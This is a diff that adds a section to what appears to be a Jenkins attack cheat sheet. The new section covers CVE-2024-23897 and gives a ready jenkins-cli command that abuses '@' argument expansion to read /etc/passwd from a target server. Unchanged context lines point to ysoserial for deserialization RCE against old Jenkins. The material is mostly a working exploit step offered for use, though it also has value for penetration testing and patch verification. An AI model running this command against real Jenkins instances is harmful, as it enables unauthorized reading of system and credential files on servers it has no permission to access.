@@ -2,6 +2,14 @@
 
 Remote Code Execution
 =====================
+Jenkins CLI arbitrary read (CVE-2024-23897)
+-------------------------------------------
+[Jenkins Advisory](https://www.jenkins.io/security/advisory/2024-01-24/)
+
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins -auth abc:abc connect-node "@/etc/passwd"
+```
+
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 ---------------------------------------------------------------------------
 Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
